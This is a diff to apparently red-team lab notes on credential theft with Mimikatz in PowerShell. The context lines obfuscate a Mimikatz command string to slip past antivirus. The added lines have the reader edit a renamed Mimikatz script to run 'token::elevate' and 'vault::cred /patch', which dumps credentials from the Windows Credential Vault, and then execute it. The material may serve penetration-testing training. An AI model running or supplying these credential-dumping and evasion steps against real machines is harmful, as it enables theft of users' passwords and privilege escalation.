@@ -72,6 +72,15 @@ $1 = "s";
 $Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s + $1 ;
 Invoke-Mimi -Command $Pwn
 ```
+**there are other places to look for credentials.**
+Let's modify Invoke-MimiEx (mimikatz.ps1 we change scriptname) and look for credentials from the Windows Credential Vault.
+Open Invoke-MimiEx-vault-std27.ps1 in PowerShell ISE (Right click on it and click Edit).
+Replace **"Invoke-Mimi -Command '"sekurlsa::ekeys"' "** that we added earlier with **"Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"' "** (without quotes) in the end. 
+
+Now, run the script. Again, it may take a couple of minutes for the script execution to complete:
+```powershell
+.\Invoke-MimiEx-vault-std27.ps1
+```
 
 ### Execution Policy
 
